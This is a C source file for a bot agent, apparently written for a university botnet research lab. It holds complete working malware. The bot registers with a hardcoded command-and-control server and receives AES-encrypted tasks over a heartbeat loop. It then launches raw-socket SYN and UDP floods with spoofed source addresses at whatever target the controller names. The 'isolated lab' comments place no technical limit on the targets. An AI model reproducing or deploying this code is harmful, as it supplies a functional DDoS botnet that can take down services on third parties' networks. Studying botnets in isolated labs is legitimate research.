/*
 * ====================================================
 *  AUA CS 232/337 - Botnet Research Project
 *  Component: Bot Agent (C)
 *  Modules: SYN Flood, UDP Flood, Heartbeat loop
 *  Environment: ISOLATED VM LAB ONLY
 *               Compile with: gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto
 *               Run as root: sudo ./bot_agent
 * ====================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

/* ── Configuration ─────────────────────────────── */
#define C2_IP          "192.168.100.10"
#define C2_PORT        5000
#define AUTH_TOKEN     "LAB_RESEARCH_TOKEN_2026"
#define SHARED_SECRET  "AUA_LAB_2026_KEY"   /* matches C2_SECRET in c2_server.py */
#define HEARTBEAT_SEC  5
#define BOT_ID_LEN     32
#define RESP_BUF       8192

/* ── Pseudo-checksum for TCP/UDP ────────────────── */
typedef struct {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t length;
} PseudoHeader;

/* ── Packet buffer ──────────────────────────────── */
#define PKT_BUF 4096

/* ── Global bot state ───────────────────────────── */
char g_bot_id[BOT_ID_LEN];
volatile int g_running = 1;

/* ── AES-128 key (derived once from shared secret) ─ */
static unsigned char g_aes_key[16];
static int           g_aes_ready = 0;

/* ── Crypto helpers ─────────────────────────────── */

/* derive_key: SHA-256(SHARED_SECRET), first 16 bytes → AES-128 key.
 * Matches Python: hashlib.sha256(secret).digest()[:16]            */
static void derive_key(void) {
    unsigned char h[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char *)SHARED_SECRET, strlen(SHARED_SECRET), h);
    memcpy(g_aes_key, h, 16);
    g_aes_ready = 1;
}

/* derive_iv: MD5(nonce string) → 16-byte IV.
 * Matches Python: hashlib.md5(nonce.encode()).digest()             */
static void derive_iv(const char *nonce, unsigned char *iv) {
    MD5((const unsigned char *)nonce, strlen(nonce), iv);
}

/* base64_decode: decode b64_in into out. Returns decoded length or -1. */
static int b64_decode(const char *b64_in, unsigned char *out, int out_len) {
    BIO *b64  = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new_mem_buf(b64_in, (int)strlen(b64_in));
    if (!b64 || !bmem) { BIO_free_all(b64); BIO_free_all(bmem); return -1; }
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    int n = BIO_read(bmem, out, out_len);
    BIO_free_all(bmem);
    return n;
}

/* aes_cbc_decrypt: AES-128-CBC decrypt with PKCS#7 unpadding.
 * Writes NUL terminator so result is a valid C string.
 * Returns plaintext length, or -1 on error.                       */
static int aes_cbc_decrypt(const unsigned char *ct, int ct_len,
                             const unsigned char *key, const unsigned char *iv,
                             unsigned char *pt) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    int len = 0, total = 0;
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)  ||
        !EVP_DecryptUpdate(ctx, pt, &len, ct, ct_len))
        { EVP_CIPHER_CTX_free(ctx); return -1; }
    total = len;
    if (!EVP_DecryptFinal_ex(ctx, pt + len, &len))
        { EVP_CIPHER_CTX_free(ctx); return -1; }
    total += len;
    EVP_CIPHER_CTX_free(ctx);
    pt[total] = '\0';
    return total;
}

/* json_str_field: extract a quoted string value from flat JSON.
 * Finds "key":"<value>" and copies value into out.
 * Returns 1 on success, 0 if key not found.                       */
static int json_str_field(const char *json, const char *key,
                           char *out, int out_len) {
    char needle[64];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    const char *end = strchr(p, '"');
    if (!end) return 0;
    int len = (int)(end - p);
    if (len >= out_len) len = out_len - 1;
    memcpy(out, p, len);
    out[len] = '\0';
    return 1;
}

/* json_int_field: extract an integer value from flat JSON.        */
static int json_int_field(const char *json, const char *key, int def) {
    char needle[64];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return def;
    p += strlen(needle);
    while (*p == ' ') p++;
    return atoi(p);
}

/* ── Utility: compute checksum ─────────────────── */
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((unsigned char*)&oddbyte) = *(unsigned char*)ptr; sum += oddbyte; }
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/* ── Generate bot ID from hostname + pid ────────── */
void gen_bot_id(char *out) {
    char hostname[64];
    gethostname(hostname, sizeof(hostname));
    snprintf(out, BOT_ID_LEN, "bot_%s_%d", hostname, getpid());
}

/* ── SYN Flood ──────────────────────────────────── */
/*  Sends TCP SYN packets with spoofed source IPs   */
/*  to target_ip:target_port for `duration` seconds  */
void syn_flood(const char *target_ip, int target_port, int duration) {
    printf("[BOT] SYN FLOOD -> %s:%d  duration=%ds\n", target_ip, target_port, duration);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("[BOT] socket"); return; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);

    char packet[PKT_BUF];
    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    time_t end_time = time(NULL) + duration;
    long   count    = 0;
    srand(time(NULL) ^ getpid());

    while (time(NULL) < end_time && g_running) {
        memset(packet, 0, PKT_BUF);

        /* Spoof random source IP (stays within 10.0.0.0/8 for lab) */
        uint32_t fake_src = htonl(0x0A000000 | (rand() & 0x00FFFFFF));

        /* IP header */
        ip->ihl      = 5;
        ip->version  = 4;
        ip->tos      = 0;
        ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id       = htons(rand() & 0xFFFF);
        ip->frag_off = 0;
        ip->ttl      = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check    = 0;
        ip->saddr    = fake_src;
        ip->daddr    = dst.sin_addr.s_addr;

        /* TCP header */
        tcp->source  = htons(1024 + (rand() % 60000));
        tcp->dest    = htons(target_port);
        tcp->seq     = htonl(rand());
        tcp->ack_seq = 0;
        tcp->doff    = 5;
        tcp->syn     = 1;
        tcp->window  = htons(65535);
        tcp->check   = 0;
        tcp->urg_ptr = 0;

        /* TCP checksum */
        PseudoHeader ph = {0};
        ph.src_addr   = fake_src;
        ph.dst_addr   = dst.sin_addr.s_addr;
        ph.protocol   = IPPROTO_TCP;
        ph.length     = htons(sizeof(struct tcphdr));
        char chk_buf[sizeof(PseudoHeader) + sizeof(struct tcphdr)];
        memcpy(chk_buf, &ph, sizeof(PseudoHeader));
        memcpy(chk_buf + sizeof(PseudoHeader), tcp, sizeof(struct tcphdr));
        tcp->check = checksum((unsigned short *)chk_buf, sizeof(chk_buf));

        sendto(sock, packet, ntohs(ip->tot_len), 0,
               (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[BOT] SYN FLOOD done. Packets sent: %ld\n", count);
}

/* ── UDP Flood ──────────────────────────────────── */
void udp_flood(const char *target_ip, int target_port, int duration) {
    printf("[BOT] UDP FLOOD -> %s:%d  duration=%ds\n", target_ip, target_port, duration);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) { perror("[BOT] socket"); return; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(target_ip);

    /* 1 KB payload of zeros */
    char payload[1024] = {0};
    char packet[PKT_BUF];
    struct iphdr  *ip  = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));

    int pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(payload);
    time_t end_time = time(NULL) + duration;
    long   count    = 0;
    srand(time(NULL) ^ getpid() ^ 0xDEAD);

    while (time(NULL) < end_time && g_running) {
        memset(packet, 0, pkt_len);
        int dst_port = 1 + (rand() % 65534);

        ip->ihl      = 5;
        ip->version  = 4;
        ip->tot_len  = htons(pkt_len);
        ip->ttl      = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr    = htonl(0x0A000000 | (rand() & 0x00FFFFFF));
        ip->daddr    = dst.sin_addr.s_addr;

        udp->source  = htons(1024 + (rand() % 60000));
        udp->dest    = htons(dst_port);
        udp->len     = htons(sizeof(struct udphdr) + sizeof(payload));
        udp->check   = 0;

        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr),
               payload, sizeof(payload));

        sendto(sock, packet, pkt_len, 0,
               (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[BOT] UDP FLOOD done. Packets sent: %ld\n", count);
}

/* ── Simple HTTP GET via TCP socket ─────────────── */
/* Used for the heartbeat to C2 server              */
int http_post(const char *host, int port, const char *path,
              const char *body, char *resp_buf, int resp_len) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct hostent *he = gethostbyname(host);
    if (!he) { close(sock); return -1; }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }

    char req[2048];
    int n = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "X-Auth-Token: %s\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, port, strlen(body), AUTH_TOKEN, body);

    send(sock, req, n, 0);
    int total = 0, r;
    while (total < resp_len - 1 &&
           (r = recv(sock, resp_buf + total, resp_len - 1 - total, 0)) > 0)
        total += r;
    if (total > 0) resp_buf[total] = '\0';
    close(sock);
    return total;
}

/* ── Register with C2 ───────────────────────────── */
void bot_register() {
    char hostname[64];
    gethostname(hostname, sizeof(hostname));
    char body[256];
    /* "enc":1 tells C2 this bot supports AES-encrypted tasks */
    snprintf(body, sizeof(body),
        "{\"bot_id\":\"%s\",\"hostname\":\"%s\",\"arch\":\"x86_64\",\"enc\":1}",
        g_bot_id, hostname);
    char resp[RESP_BUF] = {0};
    int r = http_post(C2_IP, C2_PORT, "/register", body, resp, sizeof(resp));
    if (r > 0) printf("[BOT] Registered (enc=1). Response: %.80s\n", resp);
    else printf("[BOT] Registration failed (is C2 running?)\n");
}

/* ── dispatch_task — run a decrypted/plaintext task JSON ────── */
static void dispatch_task(const char *task_json) {
    char type[32]      = {0};
    char target_ip[48] = "192.168.100.20";
    json_str_field(task_json, "type",      type,      sizeof(type));
    json_str_field(task_json, "target_ip", target_ip, sizeof(target_ip));
    int port     = json_int_field(task_json, "target_port", 80);
    int duration = json_int_field(task_json, "duration",    10);
    printf("[BOT] TASK type=%s target=%s:%d duration=%ds\n",
           type, target_ip, port, duration);
    if (strcmp(type, "syn_flood") == 0)       syn_flood(target_ip, port, duration);
    else if (strcmp(type, "udp_flood") == 0)  udp_flood(target_ip, port, duration);
    else if (strcmp(type, "idle") == 0 || type[0] == '\0') { /* no-op */ }
    else printf("[BOT] Unknown task type: %s\n", type);
}

/* ── parse_and_execute_task ─────────────────────── */
/* Handles both AES-encrypted tasks (enc=1) and     */
/* legacy plaintext tasks from the C2.              */
void parse_and_execute_task(const char *resp) {
    /* Null task */
    if (!resp || strstr(resp, "\"task\": null") || strstr(resp, "\"task\":null"))
        return;

    /* Find the task object */
    const char *task = strstr(resp, "\"task\":");
    if (!task) return;
    task += 7;
    while (*task == ' ') task++;

    /* ── Encrypted path ─────────────────────────── */
    if (strstr(task, "\"enc\": 1") || strstr(task, "\"enc\":1")) {
        if (!g_aes_ready) {
            printf("[BOT] AES key not ready — cannot decrypt task\n");
            return;
        }
        char nonce[64]     = {0};
        char b64_data[4096]= {0};
        if (!json_str_field(task, "nonce", nonce, sizeof(nonce)) ||
            !json_str_field(task, "data",  b64_data, sizeof(b64_data))) {
            printf("[BOT] Malformed encrypted task\n"); return;
        }
        unsigned char iv[16] = {0};
        derive_iv(nonce, iv);
        unsigned char ct[2048] = {0};
        int ct_len = b64_decode(b64_data, ct, sizeof(ct));
        if (ct_len <= 0) { printf("[BOT] base64 decode failed\n"); return; }
        unsigned char pt[2048] = {0};
        int pt_len = aes_cbc_decrypt(ct, ct_len, g_aes_key, iv, pt);
        if (pt_len <= 0) { printf("[BOT] AES decrypt failed\n"); return; }
        printf("[BOT] Decrypted task: %.120s\n", (char *)pt);
        dispatch_task((char *)pt);

    } else {
        /* ── Plaintext path (legacy / direct) ────── */
        dispatch_task(task);
    }
}

/* ── Heartbeat thread ───────────────────────────── */
void *heartbeat_loop(void *arg) {
    (void)arg;
    printf("[BOT] Heartbeat loop started (every %ds)\n", HEARTBEAT_SEC);
    while (g_running) {
        char body[128];
        snprintf(body, sizeof(body), "{\"bot_id\":\"%s\"}", g_bot_id);
        char resp[RESP_BUF] = {0};
        int r = http_post(C2_IP, C2_PORT, "/heartbeat", body, resp, sizeof(resp));
        if (r > 0) {
            /* Find JSON body after HTTP headers */
            char *json_start = strstr(resp, "\r\n\r\n");
            if (json_start) parse_and_execute_task(json_start + 4);
        }
        sleep(HEARTBEAT_SEC);
    }
    return NULL;
}

/* ── Entry point ────────────────────────────────── */
int main(void) {
    if (getuid() != 0) {
        fprintf(stderr, "[BOT] Must run as root (raw sockets require root)\n");
        return 1;
    }

    printf("==============================================\n");
    printf(" Bot Agent v2 - AUA Botnet Research Lab\n");
    printf(" C2: %s:%d\n", C2_IP, C2_PORT);
    printf(" Crypto: AES-128-CBC (OpenSSL)\n");
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n");

    derive_key();
    printf("[BOT] AES key: ");
    for (int i = 0; i < 16; i++) printf("%02x", g_aes_key[i]);
    printf("\n");

    gen_bot_id(g_bot_id);
    printf("[BOT] Bot ID: %s\n", g_bot_id);

    bot_register();

    pthread_t hb_thread;
    pthread_create(&hb_thread, NULL, heartbeat_loop, NULL);
    pthread_join(hb_thread, NULL);

    return 0;
}